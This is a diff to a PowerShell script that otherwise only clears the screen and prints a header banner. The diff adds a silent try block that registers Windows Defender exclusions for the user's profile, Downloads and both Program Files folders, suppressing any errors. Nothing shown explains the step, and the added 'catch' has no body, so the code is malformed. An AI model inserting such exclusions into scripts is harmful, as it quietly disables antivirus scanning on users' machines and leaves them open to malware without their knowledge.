@@ -1,6 +1,13 @@
 $ProgressPreference = 'SilentlyContinue'
 Clear-Host
 
+try {
+    Add-MpPreference -ExclusionPath "$env:USERPROFILE" -ErrorAction SilentlyContinue
+    Add-MpPreference -ExclusionPath (Join-Path $env:USERPROFILE 'Downloads') -ErrorAction SilentlyContinue
+    Add-MpPreference -ExclusionPath "$env:ProgramFiles" -ErrorAction SilentlyContinue
+    Add-MpPreference -ExclusionPath "$env:ProgramFiles(x86)" -ErrorAction SilentlyContinue
+} catch 
+
 function Show-Header {
     Write-Host ""
     Write-Host "======================================" -ForegroundColor Cyan
